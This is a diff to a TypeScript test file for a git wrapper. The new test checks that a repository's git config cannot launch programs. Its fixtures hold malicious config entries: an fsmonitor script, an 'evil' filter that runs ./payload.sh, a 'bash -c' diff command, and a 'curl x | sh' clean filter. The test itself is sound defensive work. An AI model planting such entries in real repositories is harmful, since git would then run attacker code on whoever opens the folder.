@@ -2,7 +2,7 @@ import * as path from "node:path";
 
 import { describe, expect, it } from "vitest";
 
-import { enclosingFolder, ghBringsFiles, gitBringsFiles, parseGit } from "../../src/core/govern/command";
+import { enclosingFolder, ghBringsFiles, gitBringsFiles, parseGit, quietGit, repoConfigText, silencedRepoConfig } from "../../src/core/govern/command";
 import { mayRelease, offersGovernRestore, offersGovernVerdict, openAdmission, prepareArgs, readApply, readGoverned, readNotice, readPrepare, readRestore, readVerdict, restoreArgs, sameCheck, shouldRestore, unheldAfter, verdictArgs, type GovernConfig } from "../../src/core/govern/contract";
 import { activationEnv, governStatusDir, plan, posixWrapper, standinBeside, systemGovernBin } from "../../src/core/govern/plan";
 import { report, target } from "./helpers";
@@ -132,6 +132,42 @@ describe("what the stand-in does", () => {
       SAW_BIN: "/usr/local/bin/saw",
       SAW_STANDIN_TOOL: "git",
     });
+  });
+
+  it("stops an open folder's git config from starting a program", () => {
+    const quiet = quietGit(["-c", "core.fsmonitor=./mon.sh", "status"], "/empty/hooks", ["filter.evil.clean=", "filter.evil.required=false"]);
+    expect(quiet.indexOf("-c")).toBeLessThan(quiet.indexOf("status"));
+    expect(quiet).toContain("core.fsmonitor=false");
+    expect(quiet).toContain("diff.external=");
+    expect(quiet).toContain("core.hooksPath=/empty/hooks");
+    expect(quiet).toContain("filter.evil.clean=");
+    expect(quiet).not.toContain("core.fsmonitor=./mon.sh");
+    expect(quiet.at(-1)).toBe("status");
+    const text = [
+      '[filter "lfs"]',
+      "clean = git-lfs clean -- %f",
+      "process = git-lfs filter-process",
+      '[filter "evil"]',
+      "clean = ./payload.sh",
+      '[diff "ext"]',
+      "command = bash -c evil",
+    ].join("\n");
+    expect(silencedRepoConfig(text)).toEqual([
+      "filter.evil.clean=",
+      "filter.evil.smudge=",
+      "filter.evil.process=",
+      "filter.evil.required=false",
+      "diff.ext.command=",
+      "diff.ext.textconv=",
+    ]);
+    const files = new Map<string, string>([
+      ["/repo/.git", "gitdir: /data/gitdir\n"],
+      ["/data/gitdir/config", '[include]\npath = extra\n[filter "evil"]\nclean = curl x | sh\n'],
+      ["/data/gitdir/extra", '[filter "also"]\nclean = ./x\n'],
+    ]);
+    const loaded = repoConfigText("/repo", (file) => files.get(file));
+    expect(loaded).toContain("curl x | sh");
+    expect(loaded).toContain("./x");
   });
 
   it("falls through to the real program when its configuration is gone", () => {
